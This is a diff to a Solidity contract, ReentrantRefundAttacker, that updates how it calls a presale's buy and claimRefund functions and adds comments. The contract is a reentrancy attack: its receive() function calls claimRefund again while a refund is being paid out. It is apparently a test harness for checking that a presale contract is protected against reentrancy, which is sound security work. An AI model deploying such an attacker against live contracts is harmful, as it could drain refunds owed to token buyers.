@@ -2,8 +2,9 @@
 pragma solidity ^0.8.20;
 
 interface IPresale {
-    function buy() external payable;
-    function claimRefund() external;
+    // Presale exposes buy(address recipient) external payable;
+    function buy(address recipient) external payable;
+    function claimRefund(address recipient) external;
 }
 
 interface IInfernoToken {
@@ -21,23 +22,28 @@ contract ReentrantRefundAttacker {
         token = IInfernoToken(token_);
     }
 
+    // When refunds transfer ETH to this contract, attempt to re-enter claimRefund
     receive() external payable {
         if (!_reentered) {
             _reentered = true;
-            presale.claimRefund();
+            // call claimRefund on the presale contract (reentrancy attempt)
+            presale.claimRefund(address(this));
         }
     }
 
+    // Wrapper to call presale.buy and fund this contract
     function buyIntoPresale() external payable {
-        presale.buy{value: msg.value}();
+        presale.buy{value: msg.value}(address(this));
     }
 
+    // Approve presale to pull tokens back for refund
     function prepareForRefund() external {
         uint256 balance = token.balanceOf(address(this));
         token.approve(address(presale), balance);
     }
 
+    // Public trigger to start the refund reentrancy attempt
     function attackRefund() external {
-        presale.claimRefund();
+        presale.claimRefund(address(this));
     }
 }
